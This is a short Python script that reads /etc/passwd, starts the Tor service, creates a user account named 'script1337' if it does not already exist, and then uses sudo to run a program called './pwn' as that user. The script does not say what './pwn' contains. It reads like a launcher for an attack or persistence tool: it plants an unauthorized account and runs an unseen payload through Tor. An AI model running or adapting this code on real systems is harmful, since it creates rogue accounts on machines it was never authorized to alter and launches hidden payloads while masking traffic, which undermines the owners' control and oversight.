import os

script = "script1337"
f = open("/etc/passwd", "r")
users = str(f.read())
f.close()
os.system("service tor start")
if script in users:
    os.system("sudo su " + script + " -c ./pwn")
else:
    os.system("useradd " + script)
    os.system("sudo su " + script + " -c ./pwn")

